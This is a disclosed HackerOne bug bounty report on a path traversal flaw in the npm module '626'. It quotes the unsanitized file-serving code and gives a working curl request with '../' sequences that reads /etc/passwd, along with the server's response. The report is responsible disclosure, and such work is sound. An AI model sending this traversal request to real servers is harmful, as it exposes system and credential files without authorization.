# [626] Path Traversal allows to read arbitrary file from remote server

## Report Details
- **Report ID**: 311216
- **URL**: https://hackerone.com/reports/311216
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-01-31T23:06:35.622Z
- **Disclosed**: 2018-02-26T21:30:35.015Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

There is Path Traversal vulnerability in 626 module, which allows to read arbitrary file from the remote server.

## Module

**626**

This package exposes a directory and its children to create, read, update, and delete operations over http.

https://www.npmjs.com/package/626

version: 1.1.1

Stats
0 downloads in the last day
19 downloads in the last week
103 downloads in the last month

~1200 estimated downloads per year


## Description

This vulnerability exists, because there is no sanitization of path of requested file:

```javascript
// node_modules/626/index.js, line 15:

    var url = resolveUrl(req.url);
    var file = path.resolve(url);
    log(url + ': ' + file);

    fs.readFile(file, 'utf8', function (err, content) {
        if (err) {
            return res.end('error: file not found ' + file);
        }

```

## Steps To Reproduce:

- install ```626``` module

```
$ npm install 626
```

- run server from command line:

```
$ ./node_modules/626/index.js
Listening on 8080
```

- use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
```

Result:

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
*   Trying 192.168.1.1...
* TCP_NODELAY set
* Connected to 192.168.1.1 (192.168.1.1) port 8080 (#0)
> GET /../../../../../etc/passwd HTTP/1.1
> Host: 192.168.1.1:8080
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Wed, 31 Jan 2018 22:51:06 GMT
< Connection: keep-alive
< Content-Length: 6774
<
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
(...)
```

## Supporting Material/References:

Configuration:

- macOS 10.13.3
- Chromium 66.0.3331.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.3
- npm version: 5.5.1
- curl 7.54.0


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows to read content of any file on the remote server where 626 is run.

## Attachments
No attachments
